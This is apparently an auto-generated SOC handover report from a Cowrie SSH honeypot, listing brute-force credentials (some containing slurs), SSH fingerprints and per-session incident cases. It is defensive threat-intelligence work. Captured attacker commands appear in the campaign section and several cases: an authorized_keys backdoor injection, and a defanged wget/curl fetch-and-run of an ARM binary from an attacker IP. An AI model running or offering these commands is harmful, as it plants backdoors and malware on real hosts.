# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T20:47:44Z |
| **Shift Time** | 20:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **53** |
| Confirmed Threats | **52** |
| False Positives Filtered | **1** (1.9%) |
| Unique Attacker IPs | **6** |
| Countries of Origin | **6** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **28** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **14** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `345gs5662d34` | 7 |
| `admin` | 6 |
| `ftpuser` | 2 |
| `ubnt` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `admin` | 2 |
| `ubnt` | 2 |
| `12345` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `nigger12345` | 1 |
| `root` | `54321` | 1 |
| `root` | `uClinux` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `nigger12345` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `54321` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `uClinux` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `admin` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `administrator` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `VXrepNwVm8vxFqMS` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `nigger` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `ubnt` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `12345` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `4321` | `176.65.139.67` | 2026-04-09T19:07:05 |
| `root` | `1234` | `176.65.139.67` | 2026-04-09T19:07:06 |
| `root` | `root0#` | `118.145.246.159` | 2026-04-09T20:21:03 |
| `root` | `3245gs5662d34` | `118.145.246.159` | 2026-04-09T20:21:09 |
| `root` | `opengate` | `103.142.26.46` | 2026-04-09T20:23:48 |
| `root` | `3245gs5662d34` | `103.142.26.46` | 2026-04-09T20:23:51 |
| `root` | `Mj123456` | `36.93.249.106` | 2026-04-09T20:31:36 |
| `root` | `3245gs5662d34` | `36.93.249.106` | 2026-04-09T20:31:39 |
| `root` | `Password123!` | `36.93.249.106` | 2026-04-09T20:34:59 |
| `root` | `Abcd12..` | `36.93.249.106` | 2026-04-09T20:40:15 |
| `root` | `root2025@` | `36.93.249.106` | 2026-04-09T20:42:04 |
| `root` | `P@ssw0rd@2026` | `36.93.249.106` | 2026-04-09T20:45:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **53** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 30 |
| Go SSH scanner | 21 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 30 | 3 |
| `0a07365cc01f...` | Generic scanner | 21 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 30 | 3 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 21 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.142.26.46`, `36.93.249.106`, `118.145.246.159`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **6** |
| Unique ASNs | **6** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS37457` | Telkom SA Ltd. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS214472` | Offshore LC | 1 | HIGH |
| `AS135951` | Webico Company Limited | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-681041f9c0b0

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128ec445cc22

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b81c5f1999

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51a09ef88692

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39be952cdef

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c877426e639c

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp; (wget hxxp://176.65.139[.]67/arm7 -O meow || curl -O meow hxxp://176.65.139[.]67/arm7); chmod +x arm7; ./arm7 aterna, wget hxxp://176.65.139[.]67/arm7 -O meow, curl -O meow hxxp://176.65.139[.]67/arm7` |
| **Download Attempts** | hxxp://176.65.139[.]67/arm7 |
| **Malware Analysis** | 8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d (LOW) |
| **TTPs (MITRE)** | T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:06` | `cowrie.client.size` |
| `2026-04-09 19:07:06` | `cowrie.session.params` |
| `2026-04-09 19:07:06` | `cowrie.command.input` |
| `2026-04-09 19:07:06` | `cowrie.command.input` |
| `2026-04-09 19:07:06` | `cowrie.command.input` |
| `2026-04-09 19:07:06` | `cowrie.log.closed` |
| `2026-04-09 19:07:07` | `cowrie.session.file_download` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53492327bdd8

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7159c1fb9a3

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b36221a70509

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8e24c68acd

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:05` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d12eb94076d3

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]67` |
| **First Seen** | 2026-04-09 19:07 |
| **Last Seen** | 2026-04-09 19:07 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 19:07:04` | `cowrie.session.connect` |
| `2026-04-09 19:07:04` | `cowrie.client.version` |
| `2026-04-09 19:07:05` | `cowrie.client.kex` |
| `2026-04-09 19:07:06` | `cowrie.login.success` |
| `2026-04-09 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]67` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5982f1ac1915

| Field | Detail |
|---|---|
| **Source IP** | `118.145.246[.]159` |
| **First Seen** | 2026-04-09 20:21 |
| **Last Seen** | 2026-04-09 20:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:21:02` | `cowrie.session.connect` |
| `2026-04-09 20:21:02` | `cowrie.client.version` |
| `2026-04-09 20:21:02` | `cowrie.client.kex` |
| `2026-04-09 20:21:03` | `cowrie.login.success` |
| `2026-04-09 20:21:03` | `cowrie.session.params` |
| `2026-04-09 20:21:03` | `cowrie.command.input` |
| `2026-04-09 20:21:03` | `cowrie.command.failed` |
| `2026-04-09 20:21:04` | `cowrie.log.closed` |
| `2026-04-09 20:21:04` | `cowrie.session.params` |
| `2026-04-09 20:21:04` | `cowrie.command.input` |
| `2026-04-09 20:21:04` | `cowrie.session.file_download` |
| `2026-04-09 20:21:04` | `cowrie.log.closed` |
| `2026-04-09 20:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.246[.]159` to AbuseIPDB if not already reported
- [ ] Block `118.145.246[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06267231a477

| Field | Detail |
|---|---|
| **Source IP** | `118.145.246[.]159` |
| **First Seen** | 2026-04-09 20:21 |
| **Last Seen** | 2026-04-09 20:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:21:06` | `cowrie.session.connect` |
| `2026-04-09 20:21:07` | `cowrie.client.version` |
| `2026-04-09 20:21:07` | `cowrie.client.kex` |
| `2026-04-09 20:21:09` | `cowrie.login.success` |
| `2026-04-09 20:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.246[.]159` to AbuseIPDB if not already reported
- [ ] Block `118.145.246[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e24b9bae916f

| Field | Detail |
|---|---|
| **Source IP** | `103.142.26[.]46` |
| **First Seen** | 2026-04-09 20:23 |
| **Last Seen** | 2026-04-09 20:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:23:48` | `cowrie.session.connect` |
| `2026-04-09 20:23:48` | `cowrie.client.version` |
| `2026-04-09 20:23:48` | `cowrie.client.kex` |
| `2026-04-09 20:23:48` | `cowrie.login.success` |
| `2026-04-09 20:23:49` | `cowrie.session.params` |
| `2026-04-09 20:23:49` | `cowrie.command.input` |
| `2026-04-09 20:23:49` | `cowrie.command.failed` |
| `2026-04-09 20:23:49` | `cowrie.log.closed` |
| `2026-04-09 20:23:49` | `cowrie.session.params` |
| `2026-04-09 20:23:49` | `cowrie.command.input` |
| `2026-04-09 20:23:49` | `cowrie.session.file_download` |
| `2026-04-09 20:23:49` | `cowrie.log.closed` |
| `2026-04-09 20:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.142.26[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.142.26[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749b43e90bda

| Field | Detail |
|---|---|
| **Source IP** | `103.142.26[.]46` |
| **First Seen** | 2026-04-09 20:23 |
| **Last Seen** | 2026-04-09 20:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:23:51` | `cowrie.session.connect` |
| `2026-04-09 20:23:51` | `cowrie.client.version` |
| `2026-04-09 20:23:51` | `cowrie.client.kex` |
| `2026-04-09 20:23:51` | `cowrie.login.success` |
| `2026-04-09 20:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.142.26[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.142.26[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374f805f6751

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:31 |
| **Last Seen** | 2026-04-09 20:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:31:36` | `cowrie.session.connect` |
| `2026-04-09 20:31:36` | `cowrie.client.version` |
| `2026-04-09 20:31:36` | `cowrie.client.kex` |
| `2026-04-09 20:31:36` | `cowrie.login.success` |
| `2026-04-09 20:31:36` | `cowrie.session.params` |
| `2026-04-09 20:31:36` | `cowrie.command.input` |
| `2026-04-09 20:31:36` | `cowrie.command.failed` |
| `2026-04-09 20:31:36` | `cowrie.log.closed` |
| `2026-04-09 20:31:37` | `cowrie.session.params` |
| `2026-04-09 20:31:37` | `cowrie.command.input` |
| `2026-04-09 20:31:37` | `cowrie.session.file_download` |
| `2026-04-09 20:31:37` | `cowrie.log.closed` |
| `2026-04-09 20:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826e5512cbe0

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:31 |
| **Last Seen** | 2026-04-09 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:31:38` | `cowrie.session.connect` |
| `2026-04-09 20:31:38` | `cowrie.client.version` |
| `2026-04-09 20:31:38` | `cowrie.client.kex` |
| `2026-04-09 20:31:39` | `cowrie.login.success` |
| `2026-04-09 20:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4a6273fe1d

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:34 |
| **Last Seen** | 2026-04-09 20:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:34:59` | `cowrie.session.connect` |
| `2026-04-09 20:34:59` | `cowrie.client.version` |
| `2026-04-09 20:34:59` | `cowrie.client.kex` |
| `2026-04-09 20:34:59` | `cowrie.login.success` |
| `2026-04-09 20:34:59` | `cowrie.session.params` |
| `2026-04-09 20:34:59` | `cowrie.command.input` |
| `2026-04-09 20:34:59` | `cowrie.command.failed` |
